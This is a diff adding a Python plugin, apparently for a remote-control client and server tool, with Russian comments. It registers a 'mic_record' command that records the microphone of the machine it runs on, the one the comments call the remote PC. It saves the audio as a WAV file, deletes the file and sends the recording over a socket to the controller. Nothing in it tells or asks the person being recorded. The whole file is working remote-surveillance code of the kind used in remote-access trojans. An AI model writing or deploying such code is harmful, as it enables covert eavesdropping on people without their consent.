@@ -1,0 +1,39 @@
+import os
+import struct
+import sounddevice as sd
+import scipy.io.wavfile as wav
+
+def send_payload(sock, status: int, payload: bytes):
+    header = struct.pack("!BQ", status, len(payload))
+    sock.sendall(header + payload)
+
+def handle_mic(sock, arg):
+    duration = int(arg) if arg.isdigit() else 5
+    fs = 44100  # Частота дискретизации
+    
+    try:
+        # Запись звука с микрофона удаленного ПК
+        recording = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16')
+        sd.wait()
+        
+        filename = "temp_mic.wav"
+        wav.write(filename, fs, recording)
+        
+        with open(filename, "rb") as f:
+            file_data = f.read()
+        
+        os.remove(filename)
+        send_payload(sock, 1, file_data)
+    except Exception as e:
+        send_payload(sock, 0, str(e).encode("utf-8"))
+
+def get_commands():
+    return {
+        "mic_record": handle_mic
+    }
+
+def get_help():
+    """Возвращает словарь с описанием команд для справки сервера"""
+    return {
+        "mic_record [сек]": "Записать звук с микрофона клиента указанное число секунд (сохранится в .wav)"
+    }
